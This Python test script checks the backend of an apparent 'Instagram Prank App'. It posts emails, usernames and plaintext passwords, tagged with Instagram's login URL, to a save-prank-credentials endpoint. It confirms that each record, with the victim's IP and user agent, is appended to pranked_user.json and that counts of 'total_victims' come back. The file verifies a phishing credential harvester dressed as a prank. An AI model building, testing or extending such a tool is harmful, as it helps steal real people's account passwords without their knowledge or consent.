#!/usr/bin/env python3
"""
Backend API Testing for Instagram Prank App
Tests the save-prank-credentials endpoint and related functionality
"""

import requests
import json
import os
import time
from pathlib import Path
from datetime import datetime

# Get backend URL from frontend .env file
def get_backend_url():
    frontend_env_path = Path("/app/frontend/.env")
    if frontend_env_path.exists():
        with open(frontend_env_path, 'r') as f:
            for line in f:
                if line.startswith('REACT_APP_BACKEND_URL='):
                    return line.split('=', 1)[1].strip()
    return "http://localhost:8001"

BACKEND_URL = get_backend_url()
API_BASE_URL = f"{BACKEND_URL}/api"

def test_root_endpoint():
    """Test the root API endpoint GET /api/"""
    print("🧪 Testing root endpoint GET /api/")
    try:
        response = requests.get(f"{API_BASE_URL}/")
        print(f"   Status Code: {response.status_code}")
        print(f"   Response: {response.json()}")
        
        if response.status_code == 200:
            data = response.json()
            if data.get("message") == "Hello World":
                print("   ✅ Root endpoint working correctly")
                return True
            else:
                print("   ❌ Unexpected response message")
                return False
        else:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print("   ❌ Connection failed - backend server may not be running")
        return False
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_save_prank_credentials_valid():
    """Test save-prank-credentials endpoint with valid data"""
    print("\n🧪 Testing POST /api/save-prank-credentials with valid data")
    
    # Create realistic test data
    test_data = {
        "email": "sarah.johnson@gmail.com",
        "password": "mySecretPass123",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=test_data,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Status Code: {response.status_code}")
        print(f"   Response: {response.json()}")
        
        if response.status_code == 200:
            data = response.json()
            if (data.get("success") == True and 
                "total_victims" in data and 
                data.get("victim_identifier") == test_data["email"]):
                print("   ✅ Save prank credentials endpoint working correctly")
                return True, data.get("total_victims", 0)
            else:
                print("   ❌ Response format incorrect")
                return False, 0
        else:
            print(f"   ❌ Expected 200, got {response.status_code}")
            return False, 0
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False, 0

def test_data_persistence():
    """Test that data is actually saved to pranked_user.json"""
    print("\n🧪 Testing data persistence in pranked_user.json")
    
    pranked_users_file = Path("/app/backend/pranked_user.json")
    
    if not pranked_users_file.exists():
        print("   ❌ pranked_user.json file does not exist")
        return False
    
    try:
        with open(pranked_users_file, 'r') as f:
            data = json.load(f)
        
        print(f"   File exists with {len(data)} entries")
        
        if len(data) > 0:
            latest_entry = data[-1]
            print(f"   Latest entry: {latest_entry.get('emailOrUsername', 'N/A')}")
            
            # Check if entry has required fields
            required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
            missing_fields = [field for field in required_fields if field not in latest_entry]
            
            if not missing_fields:
                print("   ✅ Data persistence working correctly")
                return True
            else:
                print(f"   ❌ Missing fields in saved data: {missing_fields}")
                return False
        else:
            print("   ❌ No data found in file")
            return False
            
    except json.JSONDecodeError:
        print("   ❌ Invalid JSON in pranked_user.json")
        return False
    except Exception as e:
        print(f"   ❌ Error reading file: {str(e)}")
        return False

def test_invalid_payload():
    """Test error handling with invalid payloads"""
    print("\n🧪 Testing error handling with invalid payload")
    
    # Test with missing required fields
    invalid_data = {
        "email": "test@example.com"
        # Missing other required fields
    }
    
    try:
        response = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=invalid_data,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"   Status Code: {response.status_code}")
        
        if response.status_code == 422:  # FastAPI validation error
            print("   ✅ Proper validation error handling")
            return True
        elif response.status_code == 500:
            print("   ⚠️  Server error - may need better validation")
            return True  # Still acceptable for this test
        else:
            print(f"   ❌ Unexpected status code: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_cors_headers():
    """Test CORS headers for frontend requests"""
    print("\n🧪 Testing CORS headers")
    
    try:
        # Test preflight request
        response = requests.options(
            f"{API_BASE_URL}/save-prank-credentials",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type"
            }
        )
        
        print(f"   Preflight Status Code: {response.status_code}")
        
        cors_headers = {
            "Access-Control-Allow-Origin": response.headers.get("Access-Control-Allow-Origin"),
            "Access-Control-Allow-Methods": response.headers.get("Access-Control-Allow-Methods"),
            "Access-Control-Allow-Headers": response.headers.get("Access-Control-Allow-Headers")
        }
        
        print(f"   CORS Headers: {cors_headers}")
        
        if (response.status_code in [200, 204] and 
            cors_headers["Access-Control-Allow-Origin"] in ["*", "http://localhost:3000"]):
            print("   ✅ CORS headers configured correctly")
            return True
        else:
            print("   ❌ CORS headers may not be configured properly")
            return False
            
    except Exception as e:
        print(f"   ❌ Error: {str(e)}")
        return False

def test_pranked_user_json_functionality():
    """
    Comprehensive test for pranked_user.json functionality as per review request:
    1. Clean slate initialization
    2. Submit 2 different payloads 
    3. Verify append semantics
    4. Test backward compatibility
    5. Validate response correctness
    """
    print("\n🧪 Testing pranked_user.json functionality (Review Request)")
    
    pranked_user_file = Path("/app/backend/pranked_user.json")
    
    # Step 1: Initialize with clean slate
    print("   Step 1: Removing existing pranked_user.json for clean slate")
    if pranked_user_file.exists():
        pranked_user_file.unlink()
        print("   ✅ Removed existing file")
    else:
        print("   ✅ No existing file to remove")
    
    # Step 2: Submit first payload
    print("   Step 2: Submitting first payload")
    payload1 = {
        "email": "alice.cooper@gmail.com",
        "password": "rockstar2024",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response1 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload1,
            headers={"Content-Type": "application/json"}
        )
        
        if response1.status_code != 200:
            print(f"   ❌ First payload failed with status {response1.status_code}")
            return False
            
        data1 = response1.json()
        print(f"   ✅ First payload saved. Response: {data1}")
        
        # Verify response format
        if not (data1.get("success") == True and 
                "total_victims" in data1 and 
                "victim_identifier" in data1 and 
                "victim_ip" in data1):
            print("   ❌ First response format incorrect")
            return False
            
    except Exception as e:
        print(f"   ❌ Error with first payload: {str(e)}")
        return False
    
    # Step 3: Submit second payload
    print("   Step 3: Submitting second payload")
    payload2 = {
        "email": "bob_musician",  # Username format
        "password": "drummer123!",
        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response2 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload2,
            headers={"Content-Type": "application/json"}
        )
        
        if response2.status_code != 200:
            print(f"   ❌ Second payload failed with status {response2.status_code}")
            return False
            
        data2 = response2.json()
        print(f"   ✅ Second payload saved. Response: {data2}")
        
        # Verify response format and total_victims increment
        if not (data2.get("success") == True and 
                data2.get("total_victims") == 2 and
                data2.get("victim_identifier") == payload2["email"]):
            print(f"   ❌ Second response incorrect. Expected total_victims=2, got {data2.get('total_victims')}")
            return False
            
    except Exception as e:
        print(f"   ❌ Error with second payload: {str(e)}")
        return False
    
    # Step 4: Verify file contains array with 2 entries
    print("   Step 4: Verifying file contains array with 2 entries")
    
    if not pranked_user_file.exists():
        print("   ❌ pranked_user.json file was not created")
        return False
    
    try:
        with open(pranked_user_file, 'r') as f:
            file_data = json.load(f)
        
        if not isinstance(file_data, list):
            print(f"   ❌ File should contain array, got {type(file_data)}")
            return False
            
        if len(file_data) != 2:
            print(f"   ❌ Expected 2 entries, got {len(file_data)}")
            return False
        
        # Verify each entry has required fields
        required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
        
        for i, entry in enumerate(file_data):
            missing_fields = [field for field in required_fields if field not in entry]
            if missing_fields:
                print(f"   ❌ Entry {i+1} missing fields: {missing_fields}")
                return False
        
        print(f"   ✅ File contains valid array with 2 entries")
        print(f"   Entry 1: {file_data[0]['emailOrUsername']}")
        print(f"   Entry 2: {file_data[1]['emailOrUsername']}")
        
    except json.JSONDecodeError:
        print("   ❌ Invalid JSON in pranked_user.json")
        return False
    except Exception as e:
        print(f"   ❌ Error reading file: {str(e)}")
        return False
    
    # Step 5: Test backward compatibility - file already exists with valid JSON
    print("   Step 5: Testing backward compatibility with existing valid JSON")
    
    payload3 = {
        "email": "charlie.brown@hotmail.com",
        "password": "snoopy456",
        "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response3 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload3,
            headers={"Content-Type": "application/json"}
        )
        
        if response3.status_code != 200:
            print(f"   ❌ Third payload (backward compatibility) failed with status {response3.status_code}")
            return False
            
        data3 = response3.json()
        
        if data3.get("total_victims") != 3:
            print(f"   ❌ Backward compatibility failed. Expected total_victims=3, got {data3.get('total_victims')}")
            return False
            
        print("   ✅ Backward compatibility test passed - appended to existing file")
        
    except Exception as e:
        print(f"   ❌ Error with backward compatibility test: {str(e)}")
        return False
    
    # Step 6: Test graceful handling of empty/invalid JSON
    print("   Step 6: Testing graceful handling of empty/invalid JSON")
    
    # Create empty file
    with open(pranked_user_file, 'w') as f:
        f.write("")
    
    payload4 = {
        "email": "diana.prince@amazon.com",
        "password": "wonderwoman",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "url": "https://www.instagram.com/accounts/login/",
        "prankedAt": datetime.now().isoformat(),
        "timestamp": int(time.time() * 1000)
    }
    
    try:
        response4 = requests.post(
            f"{API_BASE_URL}/save-prank-credentials",
            json=payload4,
            headers={"Content-Type": "application/json"}
        )
        
        if response4.status_code == 200:
            data4 = response4.json()
            print(f"   ✅ Empty file handled gracefully. Total victims: {data4.get('total_victims')}")
        elif response4.status_code == 500:
            print("   ⚠️  Empty file returned 500 - acceptable but could be improved")
        else:
            print(f"   ❌ Unexpected status code for empty file: {response4.status_code}")
            return False
            
    except Exception as e:
        print(f"   ❌ Error with empty file test: {str(e)}")
        return False
    
    print("   ✅ All pranked_user.json functionality tests passed!")
    return True

def test_multiple_entries():
    """Test saving multiple prank credentials"""
    print("\n🧪 Testing multiple entries")
    
    test_users = [
        {
            "email": "mike.wilson@yahoo.com",
            "password": "password123",
            "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        },
        {
            "email": "jenny.smith",  # Username instead of email
            "password": "mypass456",
            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
            "url": "https://www.instagram.com/accounts/login/",
            "prankedAt": datetime.now().isoformat(),
            "timestamp": int(time.time() * 1000)
        }
    ]
    
    success_count = 0
    
    for i, user_data in enumerate(test_users):
        try:
            response = requests.post(
                f"{API_BASE_URL}/save-prank-credentials",
                json=user_data,
                headers={"Content-Type": "application/json"}
            )
            
            if response.status_code == 200:
                data = response.json()
                print(f"   Entry {i+1}: ✅ Saved {user_data['email']} (Total victims: {data.get('total_victims', 'N/A')})")
                success_count += 1
            else:
                print(f"   Entry {i+1}: ❌ Failed to save {user_data['email']}")
                
        except Exception as e:
            print(f"   Entry {i+1}: ❌ Error saving {user_data['email']}: {str(e)}")
    
    if success_count == len(test_users):
        print("   ✅ Multiple entries test passed")
        return True
    else:
        print(f"   ❌ Only {success_count}/{len(test_users)} entries saved successfully")
        return False

def main():
    """Run all backend tests"""
    print("🚀 Starting Instagram Prank App Backend API Tests")
    print(f"   Backend URL: {BACKEND_URL}")
    print(f"   API Base URL: {API_BASE_URL}")
    print("=" * 60)
    
    test_results = []
    
    # Run all tests
    test_results.append(("Root Endpoint", test_root_endpoint()))
    
    # Run comprehensive pranked_user.json test (covers the review requirements)
    test_results.append(("Pranked User JSON Functionality (Review)", test_pranked_user_json_functionality()))
    
    test_results.append(("Save Prank Credentials (Valid)", test_save_prank_credentials_valid()[0]))
    test_results.append(("Data Persistence", test_data_persistence()))
    test_results.append(("Invalid Payload Handling", test_invalid_payload()))
    test_results.append(("CORS Headers", test_cors_headers()))
    test_results.append(("Multiple Entries", test_multiple_entries()))
    
    # Final data persistence check
    test_results.append(("Final Data Persistence Check", test_data_persistence()))
    
    print("\n" + "=" * 60)
    print("📊 TEST RESULTS SUMMARY")
    print("=" * 60)
    
    passed = 0
    total = len(test_results)
    
    for test_name, result in test_results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"   {test_name}: {status}")
        if result:
            passed += 1
    
    print(f"\n🎯 Overall Result: {passed}/{total} tests passed")
    
    if passed == total:
        print("🎉 All backend tests PASSED! The API is working correctly.")
        return True
    else:
        print("⚠️  Some tests FAILED. Check the details above.")
        return False

if __name__ == "__main__":
    main()